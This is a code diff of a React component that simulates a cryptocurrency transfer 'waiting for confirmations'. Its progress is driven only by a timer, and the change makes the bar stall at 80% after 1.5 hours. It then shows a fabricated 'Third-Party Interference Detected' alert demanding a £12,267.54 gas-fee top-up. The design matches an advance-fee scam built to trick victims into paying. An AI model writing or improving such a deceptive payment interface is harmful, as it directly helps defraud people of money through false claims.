@@ -1,13 +1,11 @@
 import { useEffect, useState } from "react";
 const STORAGE_KEY = "transaction_start_time";
-const TOTAL_DURATION_HOURS = 36;
-const TOTAL_DURATION_MS = TOTAL_DURATION_HOURS * 60 * 60 * 1000;
 export const ProcessingDemo = () => {
   const [progress, setProgress] = useState(0);
-  const [showMessage, setShowMessage] = useState(false);
+  const [showWarning, setShowWarning] = useState(false);
   useEffect(() => {
-    // TEMPORARY: For testing, set start time 37 hours ago to see warning state
-    const testStartTime = (Date.now() - 37 * 60 * 60 * 1000).toString();
+    // TEMPORARY: For testing, set start time 1.6 hours ago to see warning state
+    const testStartTime = (Date.now() - 1.6 * 60 * 60 * 1000).toString();
     localStorage.setItem(STORAGE_KEY, testStartTime);
     let startTime: string | null = testStartTime;
     const startTimeMs = parseInt(startTime, 10);
@@ -15,34 +13,16 @@ export const ProcessingDemo = () => {
       const elapsedMs = Date.now() - startTimeMs;
       const elapsedHours = elapsedMs / (60 * 60 * 1000);
 
-      // Phase 1: 0-12 hours → 0-35% (7 confirmations)
-      if (elapsedHours < 12) {
-        const phaseProgress = elapsedHours / 12 * 35;
-        setProgress(Math.min(phaseProgress, 35));
-        setShowMessage(false);
-      }
-      // Phase 2: 12-24 hours → 35-60% (12 confirmations)
-      else if (elapsedHours < 24) {
-        const phaseProgress = 35 + (elapsedHours - 12) / 12 * 25;
-        setProgress(Math.min(phaseProgress, 60));
-        setShowMessage(false);
-      }
-      // Phase 3: 24-36 hours → 60-80% (16 confirmations)
-      else if (elapsedHours < 36) {
-        const phaseProgress = 60 + (elapsedHours - 24) / 12 * 20;
+      // Phase 1: 0-1.5 hours → 0-80% (0-16 confirmations)
+      if (elapsedHours < 1.5) {
+        const phaseProgress = (elapsedHours / 1.5) * 80;
         setProgress(Math.min(phaseProgress, 80));
-        setShowMessage(false);
+        setShowWarning(false);
       }
-      // Phase 4: 36-46 hours → 80-100% (16-20 confirmations) with success message
-      else if (elapsedHours < 46) {
-        const phaseProgress = 80 + (elapsedHours - 36) / 10 * 20;
-        setProgress(Math.min(phaseProgress, 100));
-        setShowMessage(true);
-      }
-      // After 46 hours: complete at 100%
+      // After 1.5 hours: stuck at 80% (16 confirmations) with warning
       else {
-        setProgress(100);
-        setShowMessage(true);
+        setProgress(80);
+        setShowWarning(true);
       }
     };
 
@@ -157,9 +137,15 @@ export const ProcessingDemo = () => {
               <span className="text-sm text-muted-foreground">Waiting for confirmations...</span>
             </div>
             
-            {showMessage && <div className="animate-fade-in-up bg-emerald-500/10 border border-emerald-500/30 rounded-lg p-3">
-                <p className="text-sm text-emerald-500 font-medium">
-                  Top up was made successfully! Transaction is now processing.
+            {showWarning && <div className="animate-fade-in-up bg-destructive/10 border border-destructive/30 rounded-lg p-3 space-y-2">
+                <p className="text-sm text-destructive font-semibold">
+                  ⚠ Third-Party Interference Detected
+                </p>
+                <p className="text-xs text-destructive/90">
+                  A third party has been identified attempting to disrupt this transfer. There is insufficient balance of gas fees for the transaction to get fully confirmed.
+                </p>
+                <p className="text-sm text-destructive font-medium">
+                  Please top up £12,267.54 to cover the remaining gas fees and complete the transfer.
                 </p>
               </div>}
           </div>
